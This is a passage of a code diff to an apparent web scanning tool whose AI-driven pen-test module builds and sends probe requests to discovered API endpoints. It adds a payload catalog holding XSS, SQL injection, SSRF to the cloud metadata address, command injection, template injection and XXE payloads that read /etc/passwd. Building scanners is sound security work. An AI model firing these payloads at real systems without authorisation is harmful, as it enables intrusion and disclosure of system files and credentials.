@@ -4364,6 +4364,18 @@ class WebSiteFetch(object):
                 payload=default_payload,
                 max_steps=max(2, self._safe_int_value(runtime_settings.get("max_tool_calls"), self.AI_PEN_TEST_MCP_MAX_TOOL_CALLS)),
             )
+            controlled_payload_variants = []
+            for template_item in self._build_ai_pen_controlled_payload_templates(default_payload_type)[:4]:
+                if not isinstance(template_item, dict):
+                    continue
+                controlled_payload_variants.append(
+                    {
+                        "variant": str(template_item.get("variant") or "").strip(),
+                        "payload_preview": self._clip_text(template_item.get("payload", ""), 120),
+                        "expected_signal": str(template_item.get("expected_signal") or "").strip(),
+                        "proof_candidates": list(template_item.get("proof_candidates", []) or [])[:3],
+                    }
+                )
             payload_schema_hint = "|".join(list(self.AI_PEN_TEST_SUPPORTED_PAYLOAD_TYPES))
             tool_schema_hint = "|".join(list(self.AI_PEN_RUNTIME_TOOL_NAMES))
             request_obj = {
@@ -4410,6 +4422,7 @@ class WebSiteFetch(object):
                 ),
                 "default_payload_type": default_payload_type,
                 "default_payload": default_payload,
+                "controlled_payload_variants": controlled_payload_variants,
                 "mcp_enable": bool(runtime_settings.get("mcp_enable", True)),
                 "mcp_max_tool_calls": self._safe_int_value(
                     runtime_settings.get("max_tool_calls"), self.AI_PEN_TEST_MCP_MAX_TOOL_CALLS
@@ -4453,6 +4466,7 @@ class WebSiteFetch(object):
                     "confidence": "0~1 float",
                     "reason": "string",
                     "payload_type": payload_schema_hint,
+                    "payload_variant": "string",
                     "payload": "string",
                     "evidence": ["string"],
                     "next_actions": ["string"],
@@ -4491,6 +4505,7 @@ class WebSiteFetch(object):
                         "confidence": "0~1 float",
                         "reason": "string",
                         "payload_type": payload_schema_hint,
+                        "payload_variant": "string",
                         "payload": "string",
                         "evidence": ["string"],
                         "next_actions": ["string"],
@@ -4661,11 +4676,20 @@ class WebSiteFetch(object):
                 )
             if not ai_payload_type:
                 ai_payload_type = default_payload_type
+            ai_payload_variant = str(parsed_final.get("payload_variant") or "").strip()[:64]
             ai_payload = str(parsed_final.get("payload") or "").strip()[: self.AI_PEN_TEST_PAYLOAD_MAX]
             if not ai_payload and ai_payload_type and ai_payload_type != "replay":
-                inferred_payload_type, inferred_payload = self._build_ai_pen_payload_hint(ai_payload_type, risk_name)
-                if inferred_payload_type == ai_payload_type and inferred_payload:
-                    ai_payload = str(inferred_payload)[: self.AI_PEN_TEST_PAYLOAD_MAX]
+                template_obj = self._select_ai_pen_controlled_payload_template(
+                    payload_type=ai_payload_type,
+                    target_url=str(candidate.get("vuln_url") or candidate.get("target") or "").strip(),
+                    api_surface_summary=candidate.get("api_surface_summary"),
+                    variant_hint=ai_payload_variant,
+                )
+                ai_payload = str(template_obj.get("payload") or "")[: self.AI_PEN_TEST_PAYLOAD_MAX]
+                if not ai_payload:
+                    inferred_payload_type, inferred_payload = self._build_ai_pen_payload_hint(ai_payload_type, risk_name)
+                    if inferred_payload_type == ai_payload_type and inferred_payload:
+                        ai_payload = str(inferred_payload)[: self.AI_PEN_TEST_PAYLOAD_MAX]
             ai_reason = self._clip_text(parsed_final.get("reason", "") or parsed.get("reason", ""), self.AI_PEN_TEST_REASON_MAX)
             ai_evidence = self._normalize_ai_poc_keywords(parsed_final.get("evidence"), max_count=8)
             ai_tool_plan = self._normalize_ai_pen_tool_plan(
@@ -4714,6 +4738,7 @@ class WebSiteFetch(object):
                     "decision": final_decision_obj["decision"],
                     "confidence": final_decision_obj["confidence"],
                     "payload_type": final_decision_obj["payload_type"],
+                    "payload_variant": ai_payload_variant,
                     "payload": final_decision_obj["payload"],
                     "evidence": list(final_decision_obj.get("evidence", []) or []),
                     "next_actions": list(final_decision_obj.get("next_actions", []) or []),
@@ -4728,6 +4753,7 @@ class WebSiteFetch(object):
                 "confidence": ai_confidence,
                 "reason": ai_reason,
                 "payload_type": ai_payload_type,
+                "payload_variant": ai_payload_variant,
                 "payload": ai_payload,
                 "evidence": ai_evidence,
                 "next_actions": ai_actions,
@@ -5926,16 +5952,38 @@ class WebSiteFetch(object):
         payload: str,
         verification_step: str = "",
         tool_trace_parts=None,
+        tool_calls=None,
     ):
         fallback_url = str(target_url or "").strip()
         trace_method, trace_url = cls._extract_ai_pen_trace_method_and_url(tool_trace_parts, fallback_url)
+        call_list = [item for item in list(tool_calls or []) if isinstance(item, dict)]
+        request_profile = {}
+        for call_item in reversed(call_list):
+            params_obj = call_item.get("params") if isinstance(call_item.get("params"), dict) else {}
+            url_text = str(params_obj.get("url") or "").strip()
+            if not url_text:
+                continue
+            request_profile = {
+                "tool": str(call_item.get("tool") or "").strip(),
+                "url": url_text,
+                "method": str(params_obj.get("method") or "").strip().lower() or "",
+                "headers": dict(params_obj.get("headers") or {}) if isinstance(params_obj.get("headers"), dict) else {},
+                "form_data": dict(params_obj.get("form_data") or {}) if isinstance(params_obj.get("form_data"), dict) else {},
+                "json_data": dict(params_obj.get("json_data") or {}) if isinstance(params_obj.get("json_data"), dict) else {},
+                "body_data": str(params_obj.get("body_data") or ""),
+                "file_field": str(params_obj.get("file_field") or "").strip(),
+                "file_name": str(params_obj.get("file_name") or "").strip(),
+                "file_content": str(params_obj.get("file_content") or "").strip(),
+                "file_content_type": str(params_obj.get("file_content_type") or "").strip(),
+            }
+            break
         method = cls._infer_ai_pen_request_method(
             payload_type=payload_type,
             verification_step=verification_step,
             tool_trace_parts=tool_trace_parts,
-            fallback=trace_method or "GET",
+            fallback=str(request_profile.get("method") or trace_method or "GET"),
         )
-        request_url = str(trace_url or fallback_url).strip()
+        request_url = str(request_profile.get("url") or trace_url or fallback_url).strip()
         if not request_url:
             return {
                 "method": method,
@@ -5983,6 +6031,12 @@ class WebSiteFetch(object):
             "Accept": "*/*",
             "Connection": "close",
         }
+        profile_headers = dict(request_profile.get("headers") or {}) if isinstance(request_profile.get("headers"), dict) else {}
+        for header_key, header_value in profile_headers.items():
+            key_text = str(header_key or "").strip()
+            if not key_text:
+                continue
+            headers[key_text] = str(header_value or "")[:240]
         body_text = ""
 
         if payload_type_text == "jwt_probe" and payload_text:
@@ -5998,25 +6052,42 @@ class WebSiteFetch(object):
             headers["Accept"] = "application/json, text/html;q=0.9, */*;q=0.8"
 
         if method_upper in {"POST", "PUT", "PATCH"}:
-            if payload_type_text == "upload_probe":
+            profile_form_data = dict(request_profile.get("form_data") or {}) if isinstance(request_profile.get("form_data"), dict) else {}
+            profile_json_data = dict(request_profile.get("json_data") or {}) if isinstance(request_profile.get("json_data"), dict) else {}
+            profile_body_data = str(request_profile.get("body_data") or "")
+            profile_file_field = str(request_profile.get("file_field") or "").strip()
+            profile_file_name = str(request_profile.get("file_name") or "").strip()
+            profile_file_content = str(request_profile.get("file_content") or "").strip()
+            profile_file_content_type = str(request_profile.get("file_content_type") or "").strip()
+
+            if profile_file_field or payload_type_text == "upload_probe":
                 boundary = "----ARLAIPENBOUNDARY"
                 headers["Content-Type"] = "multipart/form-data; boundary={}".format(boundary)
-                if payload_text:
-                    upload_content = payload_text
-                else:
-                    upload_content = "arl-ai-pen-probe"
+                upload_content = profile_file_content or payload_text or "arl-ai-pen-probe"
+                upload_field = profile_file_field or "file"
+                upload_name = profile_file_name or "probe.txt"
+                upload_content_type = profile_file_content_type or "text/plain"
                 body_text = (
                     "--{0}\r\n"
-                    "Content-Disposition: form-data; name=\"file\"; filename=\"probe.txt\"\r\n"
-                    "Content-Type: text/plain\r\n\r\n"
-                    "{1}\r\n"
+                    "Content-Disposition: form-data; name=\"{1}\"; filename=\"{2}\"\r\n"
+                    "Content-Type: {3}\r\n\r\n"
+                    "{4}\r\n"
                     "--{0}--\r\n"
-                ).format(boundary, upload_content)
+                ).format(boundary, upload_field, upload_name, upload_content_type, upload_content)
+            elif profile_json_data:
+                headers.setdefault("Content-Type", "application/json")
+                body_text = json.dumps(profile_json_data, ensure_ascii=False)
+            elif profile_form_data:
+                headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
+                body_text = urlencode(list(profile_form_data.items()), doseq=True)
+            elif profile_body_data:
+                headers.setdefault("Content-Type", "text/plain")
+                body_text = profile_body_data
             elif payload_type_text == "graphql_probe":
                 headers["Content-Type"] = "application/json"
                 body_text = payload_text or '{"query":"query { __typename }"}'
             else:
-                headers["Content-Type"] = "application/x-www-form-urlencoded"
+                headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
                 body_text = "arl_probe={}".format(payload_text or "probe")
             headers["Content-Length"] = str(len(body_text.encode("utf-8", "ignore")))
 
@@ -6036,6 +6107,67 @@ class WebSiteFetch(object):
             "headers": headers,
             "body": body_text,
             "raw": cls._clip_multiline_text(raw_packet, cls.AI_PEN_TEST_REQUEST_PACKET_MAX),
+        }
+
+    @classmethod
+    def _build_ai_pen_request_template_summary(cls, request_packet_obj):
+        packet = request_packet_obj if isinstance(request_packet_obj, dict) else {}
+        method_text = str(packet.get("method") or "").strip().upper()
+        headers = packet.get("headers") if isinstance(packet.get("headers"), dict) else {}
+        body_text = str(packet.get("body") or "")
+        url_text = str(packet.get("url") or "").strip()
+        content_type = str(headers.get("Content-Type") or headers.get("content-type") or "").strip().lower()
+        mode_text = "query"
+        param_names = []
+        seen = set()
+
+        def append_param(raw_name):
+            name_text = str(raw_name or "").strip()
+            lowered = name_text.lower()
+            if not name_text or lowered in seen:
+                return
+            seen.add(lowered)
+            param_names.append(name_text)
+
+        try:
+            parsed = urlsplit(url_text)
+            for key_text, _ in parse_qsl(parsed.query, keep_blank_values=True):
+                append_param(key_text)
+        except Exception:
+            pass
+
+        if method_text in {"POST", "PUT", "PATCH"}:
+            if "json" in content_type:
+                mode_text = "json_data"
+                try:
+                    body_obj = json.loads(body_text) if body_text else {}
+                except Exception:
+                    body_obj = {}
+                if isinstance(body_obj, dict):
+                    for key_text in body_obj.keys():
+                        append_param(key_text)
+            elif "x-www-form-urlencoded" in content_type or "multipart/form-data" in content_type:
+                mode_text = "form_data"
+                for key_text, _ in parse_qsl(body_text, keep_blank_values=True):
+                    append_param(key_text)
+            elif body_text:
+                mode_text = "body"
+                if "xml" in content_type:
+                    for match in re.finditer(r"<([A-Za-z_][\w.-]{0,63})>", body_text):
+                        append_param(match.group(1))
+                else:
+                    append_param("body")
+
+        parts = ["mode={}".format(mode_text)]
+        if content_type:
+            parts.append("content_type={}".format(content_type[:80]))
+        if param_names:
+            parts.append("params={}".format(",".join(param_names[:6])))
+        return {
+            "mode": mode_text,
+            "content_type": content_type[:120],
+            "param_names": param_names[:12],
+            "summary": " | ".join(parts),
         }
 
     @staticmethod
@@ -6149,6 +6281,98 @@ class WebSiteFetch(object):
         return results[:limit]
 
     @classmethod
+    def _build_ai_pen_param_placeholder_value(cls, param_name: str, mode_text: str = ""):
+        name_text = str(param_name or "").strip()
+        lowered = name_text.lower()
+        mode_value = str(mode_text or "").strip().lower()
+        tags = cls._tag_ai_pen_parameter_name(name_text)
+
+        if lowered in {"page", "page_no", "pageno", "page_num", "pagenum"}:
+            return 1
+        if lowered in {"size", "page_size", "pagesize", "limit", "offset"}:
+            return 10 if lowered != "offset" else 0
+        if "object_id" in tags:
+            return 1
+        if "access_control" in tags:
+            return "user"
+        if "auth" in tags:
+            return "arl_probe"
+        if "url" in tags or "host" in tags:
+            return "https://example.com/"
+        if "file_path" in tags:
+            return "report.txt"
+        if "command" in tags:
+            return "echo test"
+        if "template" in tags:
+            return "index"
+        if "xml" in tags:
+            return "<root/>"
+        if lowered in {"q", "query", "keyword", "search", "name", "title", "desc", "description"}:
+            return "probe"
+        if mode_value == "json_data":
+            return "probe"
+        return "probe"
+
+    @classmethod
+    def _build_ai_pen_structured_param_map(cls, params, focus_param: str, focus_value, mode_text: str = ""):
+        result = {}
+        focus_name = str(focus_param or "").strip()
+        for param_name in list(params or []):
+            key_text = str(param_name or "").strip()
+            if not key_text:
+                continue
+            if key_text == focus_name:
+                result[key_text] = focus_value
+            else:
+                result[key_text] = cls._build_ai_pen_param_placeholder_value(key_text, mode_text=mode_text)
+        if focus_name and focus_name not in result:
+            result[focus_name] = focus_value
+        return result
+
+    @classmethod
+    def _escape_ai_pen_xml_text(value) -> str:
+        text = str(value if value is not None else "")
+        return (
+            text.replace("&", "&amp;")
+            .replace("<", "&lt;")
+            .replace(">", "&gt;")
+            .replace('"', "&quot;")
+            .replace("'", "&apos;")
+        )
+
+    @classmethod
+    def _build_ai_pen_structured_body_payload(
+        cls,
+        params,
+        focus_param: str,
+        focus_value,
+        mode_text: str = "",
+        content_type_text: str = "",
+    ) -> str:
+        mode_value = str(mode_text or "").strip().lower()
+        content_type_value = str(content_type_text or "").strip().lower()
+        focus_value_text = str(focus_value if focus_value is not None else "")
+
+        if ("xml" in content_type_value) or ("xml" in cls._tag_ai_pen_parameter_name(focus_param)):
+            if focus_value_text[:1] == "<" and any(token in focus_value_text.lower() for token in ("<?xml", "<!doctype", "<root", "<xml")):
+                return focus_value_text
+            structured_map = cls._build_ai_pen_structured_param_map(params, focus_param, focus_value_text, mode_text=mode_value or "body")
+            xml_parts = ["<root>"]
+            for key_text, value_text in structured_map.items():
+                tag_name = re.sub(r"[^A-Za-z0-9_.-]", "_", str(key_text or "").strip()) or "item"
+                xml_parts.append(
+                    "<{0}>{1}</{0}>".format(
+                        tag_name,
+                        cls._escape_ai_pen_xml_text(value_text),
+                    )
+                )
+            xml_parts.append("</root>")
+            return "".join(xml_parts)
+
+        structured_map = cls._build_ai_pen_structured_param_map(params, focus_param, focus_value_text, mode_text=mode_value or "body")
+        return urlencode(list(structured_map.items()), doseq=True)
+
+    @classmethod
     def _build_ai_pen_sample_interface_payload_targets(
         cls,
         target_url: str,
@@ -6186,6 +6410,8 @@ class WebSiteFetch(object):
             method_text = str(sample.get("method") or "GET").strip().upper() or "GET"
             path_text = str(sample.get("path") or "").strip()
             params = [str(param or "").strip() for param in list(sample.get("params", []) or []) if str(param or "").strip()]
+            mode_text = str(sample.get("mode") or "").strip().lower()
+            content_type_text = str(sample.get("content_type") or "").strip().lower()
             if not path_text or not params:
                 continue
 
@@ -6203,17 +6429,26 @@ class WebSiteFetch(object):
                 continue
 
             if method_text == "GET":
-                query_targets = cls._build_ai_pen_payload_probe_targets(
-                    resolved_url,
-                    payload_text,
-                    preferred_tags=preferred_tags,
-                    parameter_names=[matched_param],
-                    max_count=1,
-                )
-                for query_target in query_targets:
+                query_map = cls._build_ai_pen_structured_param_map(params, matched_param, payload_text, mode_text="query")
+                try:
+                    parsed = urlsplit(resolved_url)
+                    existing_items = parse_qsl(parsed.query, keep_blank_values=True)
+                    existing_map = {}
+                    for key_text, value_text in existing_items:
+                        key_name = str(key_text or "").strip()
+                        if key_name and key_name not in existing_map:
+                            existing_map[key_name] = value_text
+                    for key_name, value_text in existing_map.items():
+                        if key_name not in query_map:
+                            query_map[key_name] = value_text
+                    updated_query = urlencode(list(query_map.items()), doseq=True)
+                    query_target_url = urlunsplit((parsed.scheme, parsed.netloc, parsed.path, updated_query, parsed.fragment))
+                except Exception:
+                    query_target_url = cls._build_probe_url_with_payload(resolved_url, payload_text)
+                if query_target_url:
                     append_target(
                         {
-                            "url": str(query_target.get("url") or resolved_url).strip(),
+                            "url": str(query_target_url or resolved_url).strip(),
                             "method": "get",
                             "param": matched_param[:80],
                             "reason": "sample_interface_query_match",
@@ -6221,16 +6456,40 @@ class WebSiteFetch(object):
                         }
                     )
             else:
-                append_target(
-                    {
-                        "url": resolved_url,
-                        "method": method_text.lower(),
-                        "form_data": {matched_param: payload_text},
-                        "param": matched_param[:80],
-                        "reason": "sample_interface_form_match",
-                        "tags": cls._tag_ai_pen_parameter_name(matched_param),
+                target_obj = {
+                    "url": resolved_url,
+                    "method": method_text.lower(),
+                    "param": matched_param[:80],
+                    "reason": "sample_interface_form_match",
+                    "tags": cls._tag_ai_pen_parameter_name(matched_param),
+                }
+                if mode_text == "json_data" or "json" in content_type_text:
+                    target_obj["json_data"] = cls._build_ai_pen_structured_param_map(params, matched_param, payload_text, mode_text="json_data")
+                    target_obj["reason"] = "sample_interface_json_match"
+                    target_obj["headers"] = {
+                        "Content-Type": content_type_text or "application/json",
+                        "Accept": "application/json, text/html;q=0.9, */*;q=0.8",
                     }
-                )
+                elif mode_text == "body" or "xml" in content_type_text or "text/plain" in content_type_text:
+                    target_obj["body_data"] = cls._build_ai_pen_structured_body_payload(
+                        params,
+                        matched_param,
+                        payload_text,
+                        mode_text=mode_text or "body",
+                        content_type_text=content_type_text,
+                    )
+                    target_obj["reason"] = "sample_interface_body_match"
+                    if content_type_text:
+                        target_obj["headers"] = {
+                            "Content-Type": content_type_text,
+                        }
+                else:
+                    target_obj["form_data"] = cls._build_ai_pen_structured_param_map(params, matched_param, payload_text, mode_text="form_data")
+                    if content_type_text:
+                        target_obj["headers"] = {
+                            "Content-Type": content_type_text,
+                        }
+                append_target(target_obj)
             if len(results) >= limit:
                 break
 
@@ -7734,6 +7993,38 @@ class WebSiteFetch(object):
         auth_paths = []
         parameter_names = []
         parameter_seen = set()
+        sample_interfaces = []
+        sample_seen = set()
+
+        def append_sample_interface(method_name: str, path_text: str, params, mode_text: str = "", content_type_text: str = ""):
+            method_value = str(method_name or "GET").strip().upper() or "GET"
+            path_value = str(path_text or "").strip()
+            if not path_value:
+                return
+            param_list = [str(param or "").strip() for param in list(params or []) if str(param or "").strip()]
+            mode_value = str(mode_text or "").strip().lower()
+            content_type_value = str(content_type_text or "").strip().lower()
+            cache_key = "{}|{}|{}|{}|{}".format(
+                method_value,
+                path_value,
+                ",".join(param_list[:8]),
+                mode_value,
+                content_type_value,
+            )
+            if cache_key in sample_seen:
+                return
+            sample_seen.add(cache_key)
+            item = {
+                "method": method_value,
+                "path": path_value[:220],
+                "params": param_list[:6],
+                "source": "api_doc",
+            }
+            if mode_value:
+                item["mode"] = mode_value[:32]
+            if content_type_value:
+                item["content_type"] = content_type_value[:120]
+            sample_interfaces.append(item)
 
         for path_text in path_list:
             path_lower = path_text.lower()
@@ -7744,9 +8035,10 @@ class WebSiteFetch(object):
             if not isinstance(path_item, dict):
                 continue
 
-            for op_obj in path_item.values():
+            for method_name, op_obj in path_item.items():
                 if not isinstance(op_obj, dict):
                     continue
+                op_param_names = []
                 for parameter in op_obj.get("parameters", []) or []:
                     if not isinstance(parameter, dict):
                         continue
@@ -7754,16 +8046,28 @@ class WebSiteFetch(object):
                     if name_text and name_text not in parameter_seen:
                         parameter_seen.add(name_text)
                         parameter_names.append(name_text)
-                        if len(parameter_names) >= 10:
-                            break
-                if len(parameter_names) >= 10:
-                    break
-
+                    if name_text:
+                        op_param_names.append(name_text)
+                    if len(parameter_names) >= 10:
+                        break
+                request_mode = ""
+                request_content_type = ""
+                request_body_param_names = []
                 request_body = op_obj.get("requestBody")
                 if isinstance(request_body, dict):
                     content_obj = request_body.get("content")
                     if isinstance(content_obj, dict):
-                        for media_obj in content_obj.values():
+                        for media_type, media_obj in content_obj.items():
+                            media_type_text = str(media_type or "").strip().lower()
+                            if not request_content_type and media_type_text:
+                                request_content_type = media_type_text
+                            if (not request_mode) and media_type_text:
+                                if "json" in media_type_text:
+                                    request_mode = "json_data"
+                                elif ("x-www-form-urlencoded" in media_type_text) or ("multipart/form-data" in media_type_text):
+                                    request_mode = "form_data"
+                                else:
+                                    request_mode = "body"
                             if not isinstance(media_obj, dict):
                                 continue
                             schema_obj = media_obj.get("schema")
@@ -7777,12 +8081,23 @@ class WebSiteFetch(object):
                                 if key_text and key_text not in parameter_seen:
                                     parameter_seen.add(key_text)
                                     parameter_names.append(key_text)
-                                    if len(parameter_names) >= 10:
-                                        break
+                                if key_text:
+                                    request_body_param_names.append(key_text)
+                                if len(parameter_names) >= 10:
+                                    break
                             if len(parameter_names) >= 10:
                                 break
                         if len(parameter_names) >= 10:
-                            break
+                            pass
+                interface_params = op_param_names + [name for name in request_body_param_names if name not in op_param_names]
+                if interface_params:
+                    append_sample_interface(
+                        method_name=method_name,
+                        path_text=path_text,
+                        params=interface_params,
+                        mode_text=request_mode,
+                        content_type_text=request_content_type,
+                    )
             if len(parameter_names) >= 10:
                 break
 
@@ -7796,6 +8111,7 @@ class WebSiteFetch(object):
             "auth_path_count": len(auth_paths),
             "auth_paths": auth_paths[:3],
             "parameter_names": parameter_names[:10],
+            "sample_interfaces": sample_interfaces[:6],
             "security_scheme_count": int(security_scheme_count or 0),
         }
 
@@ -8140,30 +8456,53 @@ class WebSiteFetch(object):
             auth_path_seen.add(lowered)
             auth_paths.append(path_text)
 
-        def append_sample_interface(method_name: str, path_text: str, params, source_text: str):
+        def append_sample_interface(method_name: str, path_text: str, params, source_text: str, mode_text: str = "", content_type_text: str = ""):
             method_text = str(method_name or "GET").strip().upper() or "GET"
             path_value = str(path_text or "").strip()
             if not path_value:
                 return
             param_list = [str(param or "").strip() for param in list(params or []) if str(param or "").strip()]
-            cache_key = "{}|{}|{}|{}".format(method_text, path_value, ",".join(param_list[:8]), str(source_text or "").strip())
+            mode_value = str(mode_text or "").strip().lower()
+            content_type_value = str(content_type_text or "").strip().lower()
+            cache_key = "{}|{}|{}|{}|{}|{}".format(
+                method_text,
+                path_value,
+                ",".join(param_list[:8]),
+                str(source_text or "").strip(),
+                mode_value,
+                content_type_value,
+            )
             if cache_key in sample_seen:
                 return
             sample_seen.add(cache_key)
-            sample_interfaces.append(
-                {
-                    "method": method_text,
-                    "path": path_value[:220],
-                    "params": param_list[:6],
-                    "source": str(source_text or "").strip()[:64] or "surface_merge",
-                }
-            )
+            item = {
+                "method": method_text,
+                "path": path_value[:220],
+                "params": param_list[:6],
+                "source": str(source_text or "").strip()[:64] or "surface_merge",
+            }
+            if mode_value:
+                item["mode"] = mode_value[:32]
+            if content_type_value:
+                item["content_type"] = content_type_value[:120]
+            sample_interfaces.append(item)
 
         # 统一收敛 api_doc/js/runtime/form/hidden 多源参数，供参数编排器与图谱摘要共用。
         for doc_param in list(doc_summary.get("parameter_names", []) or []):
             append_param_name(doc_param)
             if len(parameter_names) >= 24:
                 break
+        for sample in list(doc_summary.get("sample_interfaces", []) or []):
+            if not isinstance(sample, dict):
+                continue
+            append_sample_interface(
+                method_name=sample.get("method"),
+                path_text=sample.get("path"),
+                params=sample.get("params"),
+                source_text=sample.get("source") or "api_doc",
+                mode_text=sample.get("mode"),
+                content_type_text=sample.get("content_type"),
+            )
 
         for item in js_targets:
             if not isinstance(item, dict):
@@ -8195,6 +8534,8 @@ class WebSiteFetch(object):
                 path_text=path_text or url_text,
                 params=params,
                 source_text=source_text or "js_api_extract",
+                mode_text=item.get("mode"),
+                content_type_text=item.get("content_type"),
             )
 
         runtime_paths = cls._extract_runtime_api_paths(runtime_calls)
@@ -8221,6 +8562,20 @@ class WebSiteFetch(object):
             url_text = str(item.get("url") or "").strip()
             if not url_text:
                 continue
+            body_param_names = []
+            request_mode = ""
+            request_content_type = ""
+            request_headers = item.get("request_headers") if isinstance(item.get("request_headers"), dict) else {}
+            if request_headers:
+                request_content_type = str(
+                    request_headers.get("Content-Type")
+                    or request_headers.get("content-type")
+                    or ""
+                ).strip().lower()
+                if "json" in request_content_type:
+                    request_mode = "json_data"
+                elif ("x-www-form-urlencoded" in request_content_type) or ("multipart/form-data" in request_content_type):
+                    request_mode = "form_data"
             try:
                 parsed = urlsplit(url_text)
                 path_text = str(parsed.path or "").strip() or url_text
@@ -8228,11 +8583,57 @@ class WebSiteFetch(object):
             except Exception:
                 path_text = url_text
                 query_params = []
+
+            for key_name in ("form_data", "json_data"):
+                data_obj = item.get(key_name) if isinstance(item.get(key_name), dict) else {}
+                if data_obj:
+                    if key_name == "json_data" and not request_mode:
+                        request_mode = "json_data"
+                    elif key_name == "form_data" and not request_mode:
+                        request_mode = "form_data"
+                    if key_name == "json_data" and not request_content_type:
+                        request_content_type = "application/json"
+                    elif key_name == "form_data" and not request_content_type:
+                        request_content_type = "application/x-www-form-urlencoded"
+                    for field_name in data_obj.keys():
+                        field_text = str(field_name or "").strip()
+                        if field_text and field_text not in body_param_names:
+                            body_param_names.append(field_text)
+
+            for key_name in ("body", "request_body"):
+                text_value = str(item.get(key_name) or "").strip()
+                if not text_value:
+                    continue
+                if text_value.startswith("{") and len(text_value) <= 2400:
+                    try:
+                        body_obj = json.loads(text_value)
+                    except Exception:
+                        body_obj = {}
+                    if isinstance(body_obj, dict):
+                        if not request_mode:
+                            request_mode = "json_data"
+                        if not request_content_type:
+                            request_content_type = "application/json"
+                        for field_name in body_obj.keys():
+                            field_text = str(field_name or "").strip()
+                            if field_text and field_text not in body_param_names:
+                                body_param_names.append(field_text)
+                elif "=" in text_value:
+                    if not request_mode:
+                        request_mode = "form_data"
+                    if not request_content_type:
+                        request_content_type = "application/x-www-form-urlencoded"
+                    for field_name, _ in parse_qsl(text_value, keep_blank_values=True):
+                        field_text = str(field_name or "").strip()
+                        if field_text and field_text not in body_param_names:
+                            body_param_names.append(field_text)
             append_sample_interface(
                 method_name=method_name,
                 path_text=path_text,
-                params=query_params,
+                params=query_params + [name for name in body_param_names if name not in query_params],
                 source_text="runtime_api",
+                mode_text=item.get("mode") or request_mode,
+                content_type_text=item.get("content_type") or request_content_type,
             )
 
         for param_name in runtime_params:
@@ -8279,6 +8680,8 @@ class WebSiteFetch(object):
                 path_text=action_path or action_text,
                 params=fields,
                 source_text="dom_form",
+                mode_text="form_data",
+                content_type_text="application/x-www-form-urlencoded",
             )
 
         for field_name in form_fields:
@@ -10221,13 +10624,408 @@ class WebSiteFetch(object):
             return "poc_scan"
         return cls._normalize_risk_type(type_text, default_value="unknown")
 
+    @classmethod
+    def _build_ai_pen_controlled_payload_templates(cls, payload_type: str):
+        payload_type_text = str(payload_type or "").strip().lower()
+        catalog = {
+            "xss_probe": [
+                {
+                    "variant": "svg_onload",
+                    "payload": "<svg/onload=alert(1)>",
+                    "preferred_tags": ["input"],
+                    "request_modes": ["query", "form_data", "json_data"],
+                    "expected_signal": "popup_or_script_execution",
+                    "proof_candidates": ["popup_execution", "reflection_then_execution"],
+                    "priority": 10,
+                },
+                {
+                    "variant": "img_onerror",
+                    "payload": "<img src=x onerror=alert(1)>",
+                    "preferred_tags": ["input"],
+                    "request_modes": ["query", "form_data", "json_data"],
+                    "expected_signal": "popup_or_script_execution",
+                    "proof_candidates": ["popup_execution", "reflection_then_execution"],
+                    "priority": 20,
+                },
+            ],
+            "sqli_probe": [
+                {
+                    "variant": "boolean_basic",
+                    "payload": "' OR '1'='1",
+                    "preferred_tags": ["input"],
+                    "request_modes": ["query", "form_data"],
+                    "expected_signal": "error_or_boolean_diff",
+                    "proof_candidates": ["error_based", "boolean_based"],
+                    "priority": 10,
+                },
+                {
+                    "variant": "boolean_json_string",
+                    "payload": "\" OR \"1\"=\"1",
+                    "preferred_tags": ["input"],
+                    "request_modes": ["json_data", "body"],
+                    "content_types": ["application/json"],
+                    "expected_signal": "error_or_boolean_diff",
+                    "proof_candidates": ["error_based", "boolean_based"],
+                    "priority": 8,
+                },
+                {
+                    "variant": "time_mysql_sleep",
+                    "payload": "' OR SLEEP(5)-- ",
+                    "preferred_tags": ["input"],
+                    "request_modes": ["query", "form_data", "json_data", "body"],
+                    "expected_signal": "timing_delay",
+                    "proof_candidates": ["time_based"],
+                    "priority": 30,
+                },
+            ],
+            "ssrf_probe": [
+                {
+                    "variant": "localhost_http",
+                    "payload": "http://127.0.0.1/",
+                    "preferred_tags": ["url", "host"],
+                    "request_modes": ["query", "form_data", "json_data", "body"],
+                    "expected_signal": "internal_http_response",
+                    "proof_candidates": ["local_network_disclosure"],
+                    "priority": 10,
+                },
+                {
+                    "variant": "metadata_http",
+                    "payload": "http://169.254.169.254/latest/meta-data/",
+                    "preferred_tags": ["url", "host"],
+                    "request_modes": ["query", "form_data", "json_data", "body"],
+                    "expected_signal": "metadata_disclosure",
+                    "proof_candidates": ["metadata_disclosure"],
+                    "priority": 24,
+                },
+            ],
+            "cmdi_probe": [
+                {
+                    "variant": "unix_id",
+                    "payload": ";id",
+                    "preferred_tags": ["command"],
+                    "request_modes": ["query", "form_data", "json_data", "body"],
+                    "expected_signal": "system_command_output",
+                    "proof_candidates": ["command_output"],
+                    "priority": 10,
+                },
+                {
+                    "variant": "unix_whoami",
+                    "payload": "&&whoami",
+                    "preferred_tags": ["command"],
+                    "request_modes": ["query", "form_data", "json_data", "body"],
+                    "expected_signal": "system_command_output",
+                    "proof_candidates": ["command_output"],
+                    "priority": 18,
+                },
+            ],
+            "ssti_probe": [
+                {
+                    "variant": "jinja_math",
+                    "payload": "{{7*7}}",
+                    "preferred_tags": ["template"],
+                    "request_modes": ["query", "form_data", "json_data", "body"],
+                    "expected_signal": "template_expression_eval",
+                    "proof_candidates": ["expression_eval"],
+                    "priority": 10,
+                },
+                {
+                    "variant": "el_math",
+                    "payload": "${7*7}",
+                    "preferred_tags": ["template"],
+                    "request_modes": ["query", "form_data", "json_data", "body"],
+                    "expected_signal": "template_expression_eval",
+                    "proof_candidates": ["expression_eval"],
+                    "priority": 20,
+                },
+            ],
+            "xxe_probe": [
+                {
+                    "variant": "entity_file_read_hosts",
+                    "payload": '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>',
+                    "preferred_tags": ["xml"],
+                    "request_modes": ["body"],
+                    "content_types": ["application/xml", "text/xml"],
+                    "expected_signal": "entity_file_read",
+                    "proof_candidates": ["entity_file_read"],
+                    "priority": 10,
+                },
+                {
+                    "variant": "entity_file_read_passwd",
+                    "payload": '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
+                    "preferred_tags": ["xml"],
+                    "request_modes": ["body"],
+                    "content_types": ["application/xml", "text/xml"],
+                    "expected_signal": "passwd_disclosure",
+                    "proof_candidates": ["passwd_disclosure"],
